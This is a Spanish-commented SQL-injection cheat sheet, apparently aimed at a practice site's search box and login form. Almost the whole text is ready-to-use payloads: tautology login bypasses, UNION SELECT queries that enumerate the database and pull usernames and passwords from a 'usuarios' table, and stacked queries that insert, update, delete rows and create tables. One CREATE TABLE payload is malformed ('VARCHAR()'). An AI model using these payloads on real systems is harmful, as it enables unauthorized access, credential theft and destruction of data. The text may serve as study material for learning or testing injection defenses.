-- BUSCADOR
-- Para obtener todos los datos de la tabla
' OR 'D'='D

-- Para mostrar informacion de la BD
algo' UNION SELECT NULL, version() #
algo' UNION SELECT NULL, @@hostname #

-- Para mostrar los usuarios/roles
algo' UNION SELECT NULL, user() #
algo' AND 'D'='R' UNION SELECT NULL, table_name FROM information_schema.tables WHERE table_name LIKE 'user%' #

-- Para mostrar todos los esquemas de la BD
algo' AND 'D'='R' UNION SELECT NULL, schema_name FROM information_schema.schemata #

-- Para obtener el nombre de la BD
algo' UNION SELECT NULL, database() #

-- Para obtener las tablas de la BD
algo' AND 'D'='R' UNION SELECT NULL, table_name FROM information_schema.tables WHERE table_schema = 'db_confidencial' #

-- Para obtener las columnas de la tabla
algo' AND 'D'='R' UNION SELECT NULL, CONCAT(table_name, 0x0a, column_name) FROM information_schema.columns WHERE table_name = 'usuarios' #

-- Para obtener los datos de la columna
algo' AND 'D'='R' UNION SELECT NULL, CONCAT(nickname, 0x0a, contra, 0x0a, id_perfil, 0x0a) FROM usuarios #

OJO
-- Para ingresar nuevos datos a una tabla
algo'); INSERT INTO `datos_usuarios`(`nickname`, `nombre`, `apellido`, `tel`, `email`) VALUES ("dylanR","Dylan","Rodas",1234,"dylan@gg.com") #

-- Para crear nuevas tablas a la BD
algo'); CREATE TABLE `db_confidencial`.`noeliminar` ( `id` INT NOT NULL , `usuario` VARCHAR(255) NOT NULL , `cookies` VARCHAR() NULL ) ENGINE = InnoDB; #

-- Para actualizar datos a una tabla
algo'); UPDATE `datos_usuarios` SET `apellido` = 'Falso' WHERE `datos_usuarios`.`nickname` = 'seriousSam' #

-- Para borrar datos en la BD
algo'); DELETE FROM `datos_usuarios` WHERE `datos_usuarios`.`nickname` = \'dylanR\' #

-- LOGIN
-- Para obtener todos los usuarios de la tabla
algo' OR 'D'='D
algo' OR 'D'='D
-- ojo
' OR 'D'='D'; /*
*/--
